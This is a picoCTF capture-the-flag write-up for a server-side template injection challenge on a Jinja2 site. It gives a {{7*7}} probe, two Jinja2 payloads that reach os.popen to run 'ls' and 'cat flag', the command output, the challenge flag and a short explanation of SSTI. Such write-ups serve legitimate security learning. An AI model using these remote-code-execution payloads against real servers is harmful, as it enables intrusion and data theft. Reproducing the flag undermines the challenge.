# Challenge Title
SSTI1 (Server Side Template Injection)

## Description
There is a website created in which anyone can post anything they want.

## Steps to Solve
1. run '{{7*7}}' to see whether the website returns '49' (Which means the input is being interpreted as code)
2. run ```'{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}'```
	Output: '__pycache__ app.py flag requirements.txt' 
3. run '{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}'

## Flag
'picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5c985a9a}'

## Notes
--> SSTI occurs when the server considers user input as a template.

--> If an attacker can inject something like:'{{ 7 * 7 }}'
   And the server replies with: '49' Jinja2 is used.
	Jinja2: a template engine used in Python web apps.
		Lets developers write HTML pages with placeholders like this:
			Hello {{username}}
		Then the server fills in the real value (Hello Mark)
		So that the developers doesn't have to create independent webpages for each user.

## Helpful References
Used the payload mentions in this blog
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
